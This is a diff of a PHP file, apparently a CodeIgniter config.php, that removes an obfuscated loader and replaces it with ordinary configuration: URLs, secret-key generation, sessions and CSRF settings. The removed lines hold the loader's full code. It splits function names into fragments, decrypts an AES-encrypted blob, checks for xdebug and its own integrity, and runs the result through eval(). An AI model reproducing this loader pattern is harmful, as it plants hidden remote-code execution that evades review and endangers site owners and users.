@@ -1,28 +1,74 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_nsqs5f0v=('bas'.'e64'.'_de'.'cod'.'e');
-$_bnjdowv4=('gzu'.'nco'.'mpr'.'ess');
-$_eibiatel=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_l2mvc268='HoL0w7FYdCI=';
-$_i7yx3qdi='sfIwoAfU';
-$_hx94nnk8='3Mtojmst';
-$_fp88dq9u='3aRx4Slr';
-$_udg0ia53='cMHA4GRY';
-$_r4o9fl7h='az72ve7m';
-$_g5bn47in='U3Pj5va3';
-$_tbm2xi08='eh6mDA==';
-$_e5n0lqbx=$_nsqs5f0v($_fp88dq9u.$_i7yx3qdi.$_hx94nnk8.$_udg0ia53.$_l2mvc268);
-$_hypur14y=$_nsqs5f0v($_g5bn47in.$_r4o9fl7h.$_tbm2xi08);
-$_riuuti6a=$_nsqs5f0v('URzcPFOvtbli7kAd08XqtITICtnp7UVpFBg8EUCCkt0MburebXBgzbrRcSbowKtuiGtgpr3vor1P1auwNpqlOXuB/U/4aNZ2zXrxSSLCQaPIVpImpJEDg05KawR4tdeGiFzIugdzLOOpYrqCzrmyVsR0YAfJ+jD/aW06Kkg7G1emien6+De/sqp6SnYE/KpviUUy0n85ZMmUb2sU2VqATmBrIufuy35i5iPrwXm5rt6NWYdFCMiTo+pttML+LMKTuI88KfY43uPrnEw7mOcdreQEtmrs5WEwyewVhj5ilKZbVMjUDsIlxm/jR+Q0GEMm4UXgUzs00qq6sRudkfT44oUSw9niDjHZy2rrhl1GM6mhy5dBimckQZVaMXbG5H4+giH0sw4rE6csonvqjalo0HoZaahZjeg3FRNhe5cRif+OrSfMATK/mUzergSIccXTqGWaIIcNJp2OQzlpNbOZmkzTww1l/20LEjaBZXI3e3BLoRnqRxmoFOmzxLyhyStDUn31uzoJZYNn0FLB3rG+OMpXfGrDoFUP5KqhDgIVJqJQGCDGfaJqfBpAenfeXnRf0XXlqVD4hxuXE9CAyA9JSctgjYr3PhrR4palyExUCG9M4dlq7VpN2JLekcbdw1cBokZPNlP1tJmbnT/ED0QLMuq8O0TVBe34yCkrNQIMF6vPVsKLlD5vsttRFZ3PMcBadCqk0C1bz0Zq9PVPaANsap0k1fn+Ym+aUKvab6jZyrDgut7xKFSOXNSznCDRYxYS3WEOao2roFAcN0vSOIVScJi6sc0HUQCCr7h+Z1BdSfOvICSgzqtXNDKCHKazI3ZdhDFbCS92Vu+4MLGf101hvoheeto8uDgGYnHEIkvFuWLxJszUi0YG2S0ij3V6Od1UrUvOXYlcbnNJNoHFBDLiCiJAPaVPmgj9w1HmT7R5zYJ+AuabF2CbRx+fUU7rhdwvzDzsB19V6obO2dMtXVDyObgkf54OIArCnZd9wx4ICww4VPbgvEzq0WH4RkLr6LdttXFhjZZhzD58Z+7FirG0cjX9aerr7/ip0wYeWXzsv8PaYXI3TUxVGZhVXn3exDSrEULcAU0WK0R0Ggb+6JX9fCMFtv6F4LRMNkSiJynlyeP8y01gFwXnhKwYA2LqNUTEMRDbuG62JwQAw08GWnIyloGXydzV4swNij3NqR4LFYf2UkssSJHQP0cwBMppOBZHfXiM1lRzlZR2iANhts+l8r48jgZb2F3sAx2VTXKQbW4VY6O4Fv1WpOnn+eczAKZTlsVSnlRAuAww5vC7YGCZTm2ibQYuN27lkK6DvfarTyQPBuQLMaoGVuU2HuUHBzEQTjzKSjAFKCJhBbzdq+pxOiSgmOVnbnYdL0ChosIUzwPYg5ot1sYmQcdgzQkkq7PAaoXOxzErW18h106CwUqg9wq4YD1CIhGn+PZxiP1Q3U3/uSNqate+5BlH3ezALhaYq8jnGPgph6jhVSHg6XWOpj2OA2MqkJnOwGH1WRgFdQnYTFwk/E691uAC6XM+/Iwfc4KESviFa3tBrSLwOHej5g==');
-$_glvjrfda=$_eibiatel($_riuuti6a,'aes-256-cbc',$_e5n0lqbx,OPENSSL_RAW_DATA,$_hypur14y);
-if($_glvjrfda===false){exit;}
-$_f3w41r08=$_bnjdowv4($_glvjrfda);
-if($_f3w41r08===false){exit;}
-$_emu2zp72='6eda3067151e45855a570cf3d383a86bfee41fd8fa9bffc74e0d351b5bd9c7bb';
-$_g6y60a8x=@file_get_contents(__FILE__);
-if($_g6y60a8x!==false){
-$_t362qecd=str_replace($_emu2zp72,"0000000000000000000000000000000000000000000000000000000000000000",$_g6y60a8x);
-$_aw5whmfk=hash("sha256",$_t362qecd);
-if($_aw5whmfk!==$_emu2zp72){@http_response_code(403);exit;}
+
+defined('BASEPATH') or exit('No direct script access allowed');
+
+
+$__is_https = (
+(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== '' && strtolower($_SERVER['HTTPS']) !== 'off')
+|| (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https')
+);
+$__host = isset($_SERVER['HTTP_HOST']) && preg_match('~^[A-Za-z0-9.\-:\[\]]+$~', $_SERVER['HTTP_HOST'])
+? $_SERVER['HTTP_HOST'] : 'localhost';
+$__script = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/index.php';
+$config['base_url'] = ($__is_https ? 'https' : 'http') . '://' . $__host
+. str_replace(basename($__script), '', $__script);
+$config['index_page'] = '';
+$config['uri_protocol'] = 'REQUEST_URI';
+$config['url_suffix'] = '';
+$config['language'] = 'english';
+$config['charset'] = 'UTF-8';
+$config['enable_hooks'] = FALSE;
+$config['subclass_prefix'] = 'MY_';
+$config['composer_autoload'] = FALSE;
+$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-';
+$config['enable_query_strings'] = FALSE;
+$config['controller_trigger'] = 'c';
+$config['function_trigger'] = 'm';
+$config['directory_trigger'] = 'd';
+$config['allow_get_array'] = TRUE;
+$config['log_threshold'] = 1;
+$config['log_path'] = '';
+$config['log_file_extension'] = '';
+$config['log_file_permissions'] = 0644;
+$config['log_date_format'] = 'Y-m-d H:i:s';
+$config['error_views_path'] = '';
+$config['cache_path'] = '';
+$config['cache_query_string'] = FALSE;
+$config['time_reference'] = 'local';
+
+
+$__secret_key_dir = defined('FCPATH') ? FCPATH : (dirname(dirname(__DIR__)) . DIRECTORY_SEPARATOR);
+$__secret_key_file = $__secret_key_dir . 'database/.secret_key';
+$__secret_key = is_file($__secret_key_file) ? trim((string) @file_get_contents($__secret_key_file)) : '';
+if (!preg_match('/^[a-f0-9]{64}$/i', $__secret_key)) {
+$__secret_key = bin2hex(random_bytes(32));
+if (@file_put_contents($__secret_key_file, $__secret_key, LOCK_EX) !== FALSE) {
+@chmod($__secret_key_file, 0600);
 }
-eval($_f3w41r08);
+}
+$config['encryption_key'] = $__secret_key;
+
+$config['sess_driver'] = 'files';
+$config['sess_cookie_name'] = 'anhcuoi_session';
+$config['sess_expiration'] = 60 * 60 * 24 * 14;
+$config['sess_save_path'] = $__secret_key_dir . 'database/sessions';
+$config['sess_match_ip'] = FALSE;
+$config['sess_time_to_update'] = 300;
+$config['sess_regenerate_destroy'] = FALSE;
+$config['cookie_prefix'] = '';
+$config['cookie_domain'] = '';
+$config['cookie_path'] = '/';
+$config['cookie_secure'] = $__is_https;
+$config['cookie_httponly'] = TRUE;
+$config['standardize_newlines'] = FALSE;
+$config['global_xss_filtering'] = FALSE;
+$config['csrf_protection'] = TRUE;
+$config['csrf_token_name'] = 'csrf_token';
+$config['csrf_cookie_name'] = 'anhcuoi_csrf';
+$config['csrf_expire'] = 60 * 60 * 24 * 14; 
+$config['csrf_regenerate'] = FALSE;
+$config['csrf_exclude_uris'] = array('health');
+$config['compress_output'] = FALSE;
+$config['rewrite_short_tags'] = FALSE;
+$config['proxy_ips'] = '';
+unset($__is_https, $__host, $__script, $__secret_key_dir, $__secret_key_file, $__secret_key);
